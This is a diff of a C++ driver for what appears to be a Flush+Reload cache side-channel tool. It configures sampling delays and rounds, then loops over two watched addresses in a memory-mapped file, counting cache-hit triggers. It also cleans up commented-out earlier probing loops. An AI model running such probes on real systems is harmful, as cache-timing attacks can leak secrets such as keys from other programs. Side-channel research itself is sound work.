@@ -8,20 +8,21 @@
 #include <iostream>
 
 
-const size_t SAMPLE_MEASURE_DELAY = 0;
-const size_t BETWEEN_ITEMS_DELAY = 0;
+const size_t SAMPLE_MEASURE_DELAY = 500000;
+const size_t BETWEEN_ITEMS_DELAY = 500000;
+const size_t BETWEEN_ROUNDS_DELAY = 500000;
+const size_t SAMPLE_ROUNDS = 100;
 const double MIN_SCORE = 1.0;
 
 
 AttackManager GetAttack(const std::string& path, size_t first_index, size_t second_index)
 {
-  std::vector<size_t> indices = { first_index, second_index };
-
-  std::unique_ptr<FlushSamplerPrimitive> primitive = std::make_unique<FlushSamplerPrimitive>();
-  std::unique_ptr<Sampler> sampler =
-    std::make_unique<ListSampler>(indices, SAMPLE_MEASURE_DELAY, BETWEEN_ITEMS_DELAY, std::move(primitive));
-  std::unique_ptr<AverageSampler> average_sampler =
-    std::make_unique<AverageSampler>(std::move(sampler), 100, 0);
+  auto indices = { first_index, second_index };
+  auto primitive = std::make_unique<FlushSamplerPrimitive>();
+  auto sampler = std::make_unique<ListSampler>(indices, SAMPLE_MEASURE_DELAY, BETWEEN_ITEMS_DELAY,
+                                               std::move(primitive));
+  auto average_sampler =
+    std::make_unique<AverageSampler>(std::move(sampler), SAMPLE_ROUNDS, BETWEEN_ROUNDS_DELAY);
 
   AttackManager attack(MemoryWrapper(path), AttackType::FlushReload, std::move(average_sampler));
 
@@ -50,61 +51,7 @@ int main(int argc, char* argv[])
     return 1;
   }
 
-
-  //    std::vector<size_t> indexes = {(size_t)addr0, (size_t)addr1};
-  //    MemoryWrapper wrapper(path);
-  //    FlushSamplerPrimitive samplerPrimitive;
-  //    std::unique_ptr<Sampler> listSampler = std::make_unique<ListSampler>(indexes, 0, 0,
-  //    std::make_unique<FlushSamplerPrimitive>(samplerPrimitive)); std::unique_ptr<AverageSampler>
-  //    sampler = std::make_unique<AverageSampler>(std::move(listSampler), 100, 0); uint total0 = 0;
-  //    uint total1 = 0;
-  //    std::vector<Measurement> measurements(sampler->GetRequiredSize());
-  //    while (true)
-  //    {
-  //        sampler->Sample(wrapper, measurements);
-  //        for (const Measurement& result : measurements)
-  //        {
-  //            if (result.index == addr0 && result.time <= LIMIT)
-  //            {
-  //                std::cout << "Case 0 triggered with score: " << result.time
-  //                          << " Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
-  //                total0++;
-  //            }
-  //            else if (result.index == addr1 && result.time <= LIMIT)
-  //            {
-  //                std::cout << "Case 1 triggered with score: " << result.time
-  //                          << " cycles. Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
-  //                total1++;
-  //            }
-  //        }
-  //    }
-
-  // works
-  // uint total0 = 0;
-  // uint total1 = 0;
-  // while (true)
-  // {
-  //     samplerPrimitive.Prepare(wrapper, addr1);
-  //     int result1 = samplerPrimitive.Sample(wrapper, addr1).time;
-  //     samplerPrimitive.Prepare(wrapper, addr0);
-  //     int result0 = samplerPrimitive.Sample(wrapper, addr0).time;
-
-  //     if (result0 <= LIMIT)
-  //     {
-  //         total0++;
-  //         std::cout << "Case 0 triggered with " << result0 << " cycles. Total: 0s: " << total0
-  //                   << " 1s: " << total1 << std::endl;
-  //     }
-  //     if (result1 <= LIMIT)
-  //     {
-  //         total1++;
-  //         std::cout << "Case 1 triggered with " << result1 << " cycles. Total: 0s: " << total0
-  //                   << " 1s: " << total1 << std::endl;
-  //     }
-  // }
-
-
-  AttackManager attack = getAttack(path, addr0, addr1);
+  AttackManager attack = GetAttack(path, addr0, addr1);
 
   uint total0 = 0;
   uint total1 = 0;
@@ -112,8 +59,8 @@ int main(int argc, char* argv[])
   std::vector<AttackResult> results;
   while (true)
   {
-    measurements.resize(0);
-    results.resize(0);
+    measurements.clear();
+    results.clear();
     attack.Attack(measurements, results);
     for (const AttackResult& result : results)
     {
@@ -125,8 +72,8 @@ int main(int argc, char* argv[])
       }
       else if (result.index == addr1 && result.score >= MIN_SCORE)
       {
-        std::cout << "Case 1 triggered with score: " << result.score
-                  << " cycles. Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
+        std::cout << "Case 1 triggered with score: " << result.score << " Total: 0s: " << total0
+                  << " 1s: " << total1 << std::endl;
         total1++;
       }
     }
